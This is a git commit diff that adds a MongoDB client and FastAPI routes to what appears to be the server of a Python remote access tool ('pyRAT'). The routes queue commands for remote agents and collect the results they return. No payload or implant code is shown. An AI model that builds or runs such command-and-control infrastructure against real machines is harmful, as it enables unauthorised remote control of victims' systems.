051b4ca6c2ba61946b406712686695b159a5ff65
simonlecynique <x@x>
2022-02-01 14:56:30 +0100

    Modified server

---
+++ example1/server/client.py
@@ -0,0 +1,48 @@
+from pymongo import MongoClient
+from pymongo.database import Database 
+from models import Command, Result, RATModel
+from typing import Optional
+
+class CollectionCrudClient:
+    def __init__(self, database:Database, collection: str, cls) -> None:
+        self.database = database
+        self.collection = collection
+        self.cls = cls
+
+    def create(self, item: RATModel):
+        new_item = self.database[self.collection].insert_one(
+            item.dict(by_alias=True)
+        ) 
+    
+    def read(self, item_id: str) -> Optional[RATModel]:
+        item = self.database[self.collection].find_one(item_id)
+        if item:
+            return self.cls(**item)
+        return None
+    
+    def find(self, filter: dict):
+        return [x for x in self.database[self.collection].find(filter)]
+
+    def delete(self, item_id: str):
+        self.database[self.collection].delete_one({'_id': item_id})
+
+    def update(self, item_id: str, updates: dict):
+        self.database[self.collection].update_one({'_id': item_id}, {"$set": updates})
+
+class pyRATDBClient:
+    def __init__(self,
+                 host='localhost',
+                 port=27017,
+                 database='pyrat',
+                 username=None,
+                 password=None) -> None:
+        if username and password:
+            self.client = MongoClient(host=host,
+                                      port=port,
+                                      username=username,
+                                      password=password)
+        else:
+            self.client = MongoClient(host=host, port=port)
+        self.database = self.client[database]
+        self.command = CollectionCrudClient(self.database, 'command', Command)
+        self.result = CollectionCrudClient(self.database, 'result', Result)
--- example1/server/server.py
+++ example1/server/server.py
@@ -1,8 +1,59 @@
 from fastapi import FastAPI
+from models import Command, Result
+from omegaconf import OmegaConf 
+from typing import List
+from client import pyRATDBClient
 
-app = FastAPI()
+app = FastAPI(openapi_url="/api/openapi.json", docs_url="/api/docs")
 
-@app.get("/")
-async def root():
-    return {"cmd": "c","arg":"test"}
+SERVER_CONF_FILE = 'server_conf.yaml'
+conf = OmegaConf.load(SERVER_CONF_FILE)
+
+# DB INIT
+if 'username' in conf.mongo:
+    client = pyRATDBClient(host=conf.mongo.hostname,
+                           port=conf.mongo.port,
+                           database=conf.mongo.db,
+                           username=conf.mongo.username,
+                           password=conf.mongo.password)
+else:
+    client = pyRATDBClient(host=conf.mongo.hostname,
+                           port=conf.mongo.port,
+                           database=conf.mongo.db)
+
+
+# ROUTES
+
+## COMMANDS
+@app.get("/", tags=["Commands"])
+def pending_commands() -> List:
+    return client.command.find({'status': 'pending'})
     
+@app.post("/command", tags=["Commands"])
+def post_command(command: Command) -> None:
+    return client.command.create(command)
+
+@app.delete("/command/{command_id}", tags=["Commands"])
+def delete_command(command_id: str) -> None:
+    return client.command.delete(command_id)
+
+@app.get("/command/{command_id}/done", tags=["Commands"])
+def done_command(command_id: str) -> None:
+    return client.command.update(command_id, {'status':'done'})
+
+@app.get("/command", tags=["Commands"])
+def get_all_commands() -> List:
+    return client.command.find({})
+
+## RESULTS    
+@app.get("/result", tags=["Commands"])
+def get_all_results() -> List:
+    return client.result.find({})
+
+@app.post("/result", tags=["Commands"])
+def post_command(result: Result) -> None:
+    return client.result.create(result)
+
+@app.delete("/result/{result_id}", tags=["Commands"])
+def delete_command(result_id: str) -> None:
+    return client.result.delete(result_id)
